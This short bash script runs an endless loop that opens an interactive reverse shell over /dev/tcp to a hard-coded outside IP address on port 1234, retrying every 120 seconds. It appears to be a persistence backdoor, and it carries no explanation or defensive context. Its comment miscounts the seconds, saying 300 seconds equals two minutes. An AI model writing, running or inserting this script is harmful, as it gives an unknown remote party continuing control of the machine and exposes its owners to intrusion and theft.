#!/usr/bin/env bash
while true; do
    /bin/bash -c 'bash -i >& /dev/tcp/146.190.59.192/1234 0>&1'
    sleep 120  # 300 seconds = 2 minutes
done
